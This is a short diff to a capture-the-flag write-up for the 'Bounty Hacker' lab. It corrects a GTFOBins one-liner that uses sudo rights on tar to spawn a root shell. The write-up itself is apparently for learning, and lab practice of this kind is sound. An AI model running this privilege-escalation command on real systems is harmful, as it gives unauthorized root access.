@@ -50,7 +50,7 @@ To be able to grab the root flag, we’ll need to escalate our privileges to roo
 ![Bounty Hacker](../Images/thm_bounty_hacker_6.png)
 
 We see that we can run the binary *‘tar’* as root. We can check at [**GTFOBins**](https://gtfobins.github.io/) if there’s a privesc command to abuse this. So we find this under the *‘tar’* and *‘sudo’* filters:
-> sudo tar -cf /dev/null /dev/null — checkpoint=1 — checkpoint-action=exec=/bin/sh
+> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ![Bounty Hacker](../Images/thm_bounty_hacker_7.png)
 
